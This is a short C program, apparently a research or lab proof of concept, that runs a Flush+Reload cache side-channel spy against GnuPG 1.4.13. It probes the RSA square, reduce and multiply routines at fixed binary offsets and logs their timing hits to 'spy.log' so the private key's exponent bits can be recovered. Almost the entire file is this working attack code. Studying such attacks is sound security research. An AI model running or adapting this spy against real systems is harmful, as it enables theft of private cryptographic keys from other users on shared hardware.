#include "fr/fr.h"

//0xbb9e5
#define RSA_SQUARE (void*) 0xbba00

//0xbaf9f
#define RSA_REDUCE (void*) 0xbafc0

//0xbb367
#define RSA_MULTIPLY (void*) 0xbb380

#define RSA_SQUARE_IDX 1
#define RSA_REDUCE_IDX 2
#define RSA_MULTIPLY_IDX 3

int main(int argc, char** argv) {

	//order: square, reduce, multiply
	FR fr = fr_init( 2048*3, RSA_SQUARE, RSA_REDUCE, RSA_MULTIPLY);

	fr_calibrate(&fr, 1.0, 10000000, "scripts/calibration.csv");

	fr_monitor_elf(&fr, "gnupg-1.4.13/g10/gpg");

	FILE* file = fopen("spy.log", "w");

	// create csv
	fprintf(file, "timeslot, square, reduce, multiply\n");
	for(unsigned int i=0; i < fr.res_len; i++) {

		fprintf(file, "%u, %u, %u, %u\n",
				i,
				fr.results[i * fr.len],
				fr.results[i * fr.len + 1],
				fr.results[i * fr.len + 2]);
	}

	fclose(file);

	return 0;
}
